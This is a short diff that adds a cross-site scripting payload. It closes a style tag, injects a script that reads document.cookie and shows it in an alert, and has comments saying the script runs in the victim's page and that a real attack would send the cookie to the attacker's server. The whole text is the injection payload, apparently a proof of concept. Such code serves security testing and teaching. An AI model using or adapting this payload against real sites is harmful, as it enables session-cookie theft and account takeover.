@@ -1,0 +1,6 @@
+</style>
+<script>
+  // This script now executes in the context of the victim's page
+  alert('XSS successful! Captured user cookie: ' + document.cookie);
+  // In a real attack, this would send the cookie to the attacker's server.
+</script>
